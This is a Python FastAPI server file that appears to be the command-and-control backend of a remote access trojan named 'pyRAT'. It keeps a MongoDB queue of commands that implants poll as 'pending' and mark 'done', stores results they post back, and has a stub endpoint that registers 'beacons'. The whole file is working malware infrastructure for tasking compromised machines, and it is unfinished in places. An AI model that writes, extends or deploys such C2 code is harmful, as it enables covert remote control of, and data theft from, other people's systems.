from fastapi import FastAPI
from omegaconf import OmegaConf 
from typing import List

from server.client import pyRATDBClient
from server.models import Command, Result

app = FastAPI(openapi_url="/api/openapi.json", docs_url="/api/docs")

SERVER_CONF_FILE = 'server/server_conf.yaml'
conf = OmegaConf.load(SERVER_CONF_FILE)

# DB INIT
if 'username' in conf.mongo:
    client = pyRATDBClient(host=conf.mongo.hostname,
                           port=conf.mongo.port,
                           database=conf.mongo.db,
                           username=conf.mongo.username,
                           password=conf.mongo.password)
else:
    client = pyRATDBClient(host=conf.mongo.hostname,
                           port=conf.mongo.port,
                           database=conf.mongo.db)


# ROUTES

## COMMANDS
@app.get("/", tags=["Commands"])
def pending_commands() -> List:
    return client.command.find({'status': 'pending'})
    
@app.post("/command", tags=["Commands"])
def post_command(command: Command) -> None:
    return client.command.create(command)

@app.delete("/command/{command_id}", tags=["Commands"])
def delete_command(command_id: str) -> None:
    return client.command.delete(command_id)

@app.get("/command/{command_id}/done", tags=["Commands"])
def done_command(command_id: str) -> None:
    return client.command.update(command_id, {'status':'done'})

@app.get("/command", tags=["Commands"])
def get_all_commands() -> List:
    return client.command.find({})

## RESULTS    
@app.get("/result", tags=["Results"])
def get_all_results() -> List:
    return client.result.find({})

@app.post("/result", tags=["Results"])
def post_command(result: Result) -> None:
    return client.result.create(result)

@app.delete("/result/{result_id}", tags=["Results"])
def delete_command(result_id: str) -> None:
    return client.result.delete(result_id)

## REGISTER
@app.get("/register", tags=["Register"])
def register_beacon() -> str:
    # TODO : create db for beacon with uuid
    return {"cookie": "cookie"}
